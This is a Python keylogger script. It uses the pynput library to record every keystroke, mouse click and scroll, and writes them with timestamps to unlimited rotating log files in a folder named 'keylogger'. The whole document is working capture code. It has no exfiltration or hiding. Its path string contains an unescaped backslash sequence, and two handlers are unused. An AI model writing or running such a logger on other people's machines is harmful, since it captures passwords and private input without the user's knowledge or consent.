from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Key
import logging
from logging.handlers import TimedRotatingFileHandler

# Set log files path
PATH = 'C:\files\inactive\data-dumps\keylogger'

# Create an INFO-level logger
logger = logging.getLogger()
logger.setLevel(logging.INFO)

# Use a timed-rotating file handler to split logs temporaly
handler = TimedRotatingFileHandler(PATH,
                                   when="m",
                                   interval=10,
                                   backupCount=0) # backupCount 0 means store unlimited log files

# Format TIMESTAMP: MESSAGE
fileFormatter = logging.Formatter('%(asctime)s: %(message)s')
handler.setFormatter(fileFormatter)
logger.addHandler(handler)

# Define keyboard and mouse event handlers
def end_rec(key):
    logger.info(str(key))

def on_press(key):
    logger.info(str(key))

def on_move(x, y):
    logger.info("Mouse moved to ({0}, {1})".format(x, y))

def on_click(x, y, button, pressed):
    if pressed:
        logger.info('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))

def on_scroll(x, y, dx, dy):
    logger.info('Mouse scrolled at ({0}, {1})({2}, {3})'.format(x, y, dx, dy))

# Start logging
with MouseListener(on_click=on_click, on_scroll=on_scroll) as listener:
    with KeyboardListener(on_press=on_press) as listener:
        listener.join()
